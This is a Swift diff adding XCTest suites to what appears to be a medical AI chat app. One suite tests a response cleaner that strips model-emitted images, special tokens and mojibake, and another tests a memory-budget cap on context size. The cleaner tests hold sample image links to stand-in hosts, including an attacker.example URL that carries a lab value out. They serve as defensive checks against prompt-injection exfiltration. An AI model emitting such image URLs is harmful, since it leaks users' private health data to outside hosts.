@@ -747,3 +747,169 @@ final class DoctorPersonaTests: XCTestCase {
         }
     }
 }
+
+// MARK: - Cleaner Pre-check
+//
+// `needsCleaning` lets the chat bubble skip a full clean on content that is already clean.
+// Its correctness condition is one-sided: a false positive only costs a wasted pass, but a
+// false negative silently disables `removingRemoteImages`, which is what stops the markdown
+// renderer fetching a model-emitted image URL. These tests are about that asymmetry.
+final class AIResponseCleanerPrecheckTests: XCTestCase {
+
+    private func assertNoFalseNegative(_ input: String, _ label: String) {
+        let cleaned = AIResponseCleaner.clean(input)
+        if cleaned != input {
+            XCTAssertTrue(
+                AIResponseCleaner.needsCleaning(input),
+                "\(label): clean() changes this text, so needsCleaning must not say otherwise"
+            )
+        }
+    }
+
+    func testDirtyInputIsAlwaysDetected() {
+        let samples: [(String, String)] = [
+            ("Here is a chart ![chart](https://evil.example/pixel.png)", "markdown image"),
+            ("<img src=\"https://evil.example/p.png\">", "html image"),
+            ("Your result<|eot_id|>", "special token"),
+            ("Normal<|im_end|>", "another special token"),
+            ("It costs \u{00E2}\u{0080}\u{0094} a lot", "mojibake em dash"),
+            ("caf\u{00C3}\u{00A9}", "mojibake accent"),
+            ("A &mdash; B", "html entity"),
+            ("Line\n\n\n\nLine", "excess newlines"),
+            ("Two  spaces inside", "collapsed spaces"),
+            ("  leading and trailing  ", "untrimmed"),
+        ]
+        for (input, label) in samples {
+            assertNoFalseNegative(input, label)
+            XCTAssertTrue(AIResponseCleaner.needsCleaning(input), "\(label) must be detected")
+        }
+    }
+
+    func testAlreadyCleanOutputIsNotFlagged() {
+        // The whole point: output of the cleaner must not need cleaning again, or the
+        // pre-check saves nothing on the normal path.
+        let inputs = [
+            "Your potassium is 5.9 mmol/L, which is above the reference range.",
+            "### Findings\n\nSodium 140 mmol/L\n\n- within range\n- no action needed",
+            "Indented list:\n\n  - first\n  - second",
+            "A sentence with an em dash — and a quote: \u{201C}hello\u{201D}.",
+        ]
+        for input in inputs {
+            let cleaned = AIResponseCleaner.clean(input)
+            XCTAssertFalse(
+                AIResponseCleaner.needsCleaning(cleaned),
+                "Cleaned output should not be flagged again: \(cleaned.prefix(40))"
+            )
+        }
+    }
+
+    func testCleaningIsIdempotentSoTheSkipIsSafe() {
+        // If a second pass could change the text, skipping it would change what is rendered.
+        let inputs = [
+            "Result ![x](https://evil.example/p.png) and <|eot_id|> and  spaces",
+            "Line\n\n\n\nLine with caf\u{00C3}\u{00A9}",
+        ]
+        for input in inputs {
+            let once = AIResponseCleaner.clean(input)
+            let twice = AIResponseCleaner.clean(once)
+            XCTAssertEqual(once, twice, "clean() must be idempotent")
+        }
+    }
+
+    func testTheRemoteImageGuardStillHoldsThroughThePrecheck() {
+        // The security property, stated end to end: a model-emitted image never survives.
+        let injected = "Summary. ![p](https://attacker.example/leak?data=potassium)"
+        XCTAssertTrue(AIResponseCleaner.needsCleaning(injected))
+
+        let rendered = AIResponseCleaner.needsCleaning(injected)
+            ? AIResponseCleaner.clean(injected)
+            : injected
+        XCTAssertFalse(rendered.contains("attacker.example"), "The image URL must not reach the renderer")
+    }
+}
+
+// MARK: - Device Memory Budget
+//
+// Nothing capped the KV cache: `MLX.Memory.memoryLimit` was unset and the context slider
+// reached 64K on any device. The per-token cost is an estimate that has never been measured
+// on hardware, so these tests pin the two properties that make acting on it safe — it only
+// ever lowers the maximum, and it never drops below the default that works today.
+final class MLXMemoryBudgetTests: XCTestCase {
+
+    private let gb: UInt64 = 1_024 * 1_024 * 1_024
+    private let mediPhiBytes: Int64 = 2_150_000_000
+    private let medGemmaBytes: Int64 = 16_022_116_230
+
+    func testASmallPhoneIsHeldWellBelowTheAppMaximum() {
+        // 64K on an 8 GB phone is roughly 24 GiB of cache by WS-11's estimate.
+        let limit = MLXMemoryBudget.maximumContextSize(
+            physicalMemory: 8 * gb,
+            modelSizeBytes: mediPhiBytes,
+            ceiling: MLXModelInfo.maxContextSize
+        )
+
+        XCTAssertLessThan(limit, MLXModelInfo.maxContextSize, "An 8 GB device must not be offered 64K")
+    }
+
+    func testTheWorkingDefaultIsNeverTakenAway() {
+        // The estimate is unvalidated, so it is not allowed to shrink a window that is known
+        // to work. This is the property that makes shipping the cap defensible at all.
+        for memory in [UInt64(4), 6, 8, 12, 16].map({ $0 * gb }) {
+            for model in [mediPhiBytes, medGemmaBytes] {
+                let limit = MLXMemoryBudget.maximumContextSize(
+                    physicalMemory: memory,
+                    modelSizeBytes: model,
+                    ceiling: MLXModelInfo.maxContextSize
+                )
+                XCTAssertGreaterThanOrEqual(
+                    limit, MLXModelInfo.defaultContextSize,
+                    "\(memory / gb) GB with a \(model / 1_000_000_000) GB model must still allow the default"
+                )
+            }
+        }
+    }
+
+    func testAModelLargerThanTheBudgetFallsBackToTheFloor() {
+        // MedGemma is 16 GB of weights; on a 24 GB Mac the share left for cache is negative.
+        // That must produce the floor, not a negative or zero window.
+        let limit = MLXMemoryBudget.maximumContextSize(
+            physicalMemory: 24 * gb,
+            modelSizeBytes: medGemmaBytes,
+            ceiling: MLXModelInfo.maxContextSize
+        )
+
+        XCTAssertEqual(limit, MLXModelInfo.defaultContextSize)
+    }
+
+    func testMoreMemoryNeverMeansLessContext() {
+        var previous = 0
+        for memory in [UInt64(4), 8, 16, 32, 64, 128].map({ $0 * gb }) {
+            let limit = MLXMemoryBudget.maximumContextSize(
+                physicalMemory: memory,
+                modelSizeBytes: mediPhiBytes,
+                ceiling: MLXModelInfo.maxContextSize
+            )
+            XCTAssertGreaterThanOrEqual(limit, previous, "Monotonic in installed memory")
+            previous = limit
+        }
+        XCTAssertEqual(previous, MLXModelInfo.maxContextSize, "A large machine should reach the app maximum")
+    }
+
+    func testTheResultIsAWholeFourKStep() {
+        for memory in [UInt64(8), 16, 24, 48].map({ $0 * gb }) {
+            let limit = MLXMemoryBudget.maximumContextSize(
+                physicalMemory: memory,
+                modelSizeBytes: mediPhiBytes,
+                ceiling: MLXModelInfo.maxContextSize
+            )
+            XCTAssertEqual(limit % 4096, 0, "The slider should land on familiar values")
+        }
+    }
+
+    func testTheAllocationCeilingLeavesHeadroomForTheSystem() {
+        let limit = MLXMemoryBudget.allocationLimitBytes(physicalMemory: 8 * gb)
+
+        XCTAssertGreaterThan(limit, 0)
+        XCTAssertLessThan(limit, Int(8 * gb), "MLX must never be allowed the whole device")
+    }
+}
